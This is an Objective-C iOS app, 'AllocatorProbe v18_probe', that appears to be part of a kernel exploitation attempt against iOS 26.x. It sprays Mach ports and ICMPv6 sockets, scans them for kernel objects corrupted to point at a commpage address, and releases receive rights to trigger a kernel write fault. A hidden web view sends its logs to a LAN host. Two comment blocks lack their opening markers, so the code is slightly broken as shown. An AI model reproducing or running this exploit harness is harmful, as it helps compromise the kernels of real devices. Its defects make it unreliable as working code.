#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <mach/mach.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>

#define NUM_PORTS        20000
#define NUM_SOCKETS      200
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
#define IKOT_TIMER       27
#define REPORT_HOST      "192.168.68.109"
#define PROBE_INTERVAL_S 5

static mach_port_t g_ports[NUM_PORTS];
static int         g_port_count = 0;
static int         g_socks[NUM_SOCKETS];
static int         g_sock_count = 0;
static _Atomic int g_found = 0;
static WKWebView  *g_webView = nil;

static void http_report(const char *msg) {
    WKWebView *wv = g_webView;
    if (!wv) return;
    NSString *raw = [NSString stringWithUTF8String:msg];
    if (!raw) return;
    raw = [raw stringByReplacingOccurrencesOfString:@"\\" withString:@"\\\\"];
    raw = [raw stringByReplacingOccurrencesOfString:@"'" withString:@"\\'"];
    NSString *script = [NSString stringWithFormat:
        @"var x=new XMLHttpRequest();"
        "x.open('POST','http://%s:9999/',true);"
        "x.send('[v18p] %@');",
        REPORT_HOST, raw];
    dispatch_async(dispatch_get_main_queue(), ^{
        [wv evaluateJavaScript:script completionHandler:nil];
    });
}

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    NSLog(@"[v18p] %{public}s", buf);
    http_report(buf);
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58);
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32);
        g_socks[g_sock_count++] = fd;
    }
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    ev("V18P_SPRAY socks=%d ports=%d target=0x%016llx kotype=%d",
       g_sock_count, g_port_count, (unsigned long long)COMMPAGE_TARGET, IKOT_TIMER);
}


 *
 * iOS 26.x returns kotype=0xFFFFFFFF from mach_port_kobject() for all spray ports
 * (IKOT_NONE obfuscation). kobject IS returned correctly (0 for uncorrupted ports).
 *
 * Trigger when EITHER:
 *   (a) kotype==27 (IKOT_TIMER visible) — direct detection
 *   (b) kobject==COMMPAGE_TARGET — shader wrote ip_kobject; real kotype IS 27 in kernel.
 *       mod_refs(-1, RECEIVE): io_refs 1->0 -> ipc_kobject_destroy -> clock cleanup
 *       -> store to (clock_t*)COMMPAGE_TARGET -> EL1 write fault -> qualifying IPS.
 */
static void *probe_loop(void *arg) {
    mach_port_t self = mach_task_self();
    int cycle = 0;

    for (;;) {
        int timer_ports = 0, triggered = 0;
        for (int i = 0; i < g_port_count; i++) {
            if (g_ports[i] == MACH_PORT_NULL) continue;
            natural_t kotype = 0;
            mach_vm_address_t kobject = 0;
            if (mach_port_kobject(self, g_ports[i], &kotype, &kobject) != KERN_SUCCESS)
                continue;
            if (kotype != IKOT_TIMER && kobject != COMMPAGE_TARGET) continue;
            timer_ports++;
            ev("TIMER_PORT port=%d kotype=%u kobject=0x%016llx — mod_refs -1 RECEIVE",
               i, kotype, (unsigned long long)kobject);
            kern_return_t kr = mach_port_mod_refs(self, g_ports[i],
                                                   MACH_PORT_RIGHT_RECEIVE, -1);
            g_ports[i] = MACH_PORT_NULL;
            triggered++;
            ev("MOD_REFS_RETURNED port=%d kr=%d", i, (int)kr);
        }
        cycle++;
        ev("PROBE_CYCLE cycle=%d ports=%d timer_found=%d triggered=%d",
           cycle, g_port_count, timer_ports, triggered);
        sleep(PROBE_INTERVAL_S);
    }
    return NULL;
}

static void scan_background(void) {
    if (g_found) return;
    for (int i = 0; i < g_port_count; i++) {
        if (g_found) break;
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject);
        if (kr != KERN_SUCCESS) continue;
        
        if (kotype == (natural_t)0xFFFFFFFF && kobject == 0) continue;

        if (kobject == COMMPAGE_TARGET) {
            g_found = 1;
            ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx — mod_refs -1 RECEIVE",
               i, kotype, (unsigned long long)kobject);
            
             * -> store to (clock_t*)COMMPAGE_TARGET -> EL1 write fault -> qualifying IPS. */
            mach_port_mod_refs(mach_task_self(), g_ports[i], MACH_PORT_RIGHT_RECEIVE, -1);
            g_ports[i] = MACH_PORT_NULL;
        } else if (kotype != 0 || kobject != 0) {
            ev("PORT_CHANGED port=%d kotype=%u kobject=0x%016llx",
               i, kotype, (unsigned long long)kobject);
        }
    }
    for (int i = 0; i < g_sock_count; i++) {
        if (g_found) break;
        unsigned char out[32]; socklen_t flen = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &flen) < 0) continue;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                ev("ICMP_CORRUPTION sock=%d byte[%d]=0x%02X", i, j, out[j]);
                break;
            }
        }
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong) UIWindow  *window;
@property (strong) NSTimer   *scanTimer;
@property (strong) WKWebView *reportView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    [UIApplication sharedApplication].idleTimerDisabled = YES;

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20, 80, 340, 60)];
    lbl.text = @"AllocatorProbe v18_probe";
    lbl.textColor = [UIColor greenColor];
    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
    [vc.view addSubview:lbl];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    
    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    cfg.allowsInlineMediaPlayback = NO;
    self.reportView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:cfg];
    self.reportView.hidden = YES;
    [vc.view addSubview:self.reportView];
    [self.reportView loadHTMLString:@"<html><body></body></html>" baseURL:nil];
    g_webView = self.reportView;

    spray();

    
    pthread_t probe_thread;
    pthread_create(&probe_thread, NULL, probe_loop, NULL);
    pthread_detach(probe_thread);

    ev("V18P_LAUNCH AllocatorProbe v18_probe N=%d probe-interval=%ds TIMER-kotype=%d",
       g_port_count, PROBE_INTERVAL_S, IKOT_TIMER);

    self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:0.10
                                                      target:self
                                                    selector:@selector(scanTick:)
                                                    userInfo:nil repeats:YES];
    return YES;
}

- (void)scanTick:(NSTimer *)t {
    static int tick = 0; tick++;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        scan_background();
    });
    if (tick % 100 == 0)
        ev("ALIVE tick=%d found=%d ports=%d", tick, g_found, g_port_count);
}

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil,
                                 NSStringFromClass([AppDelegate class]));
    }
}

@end
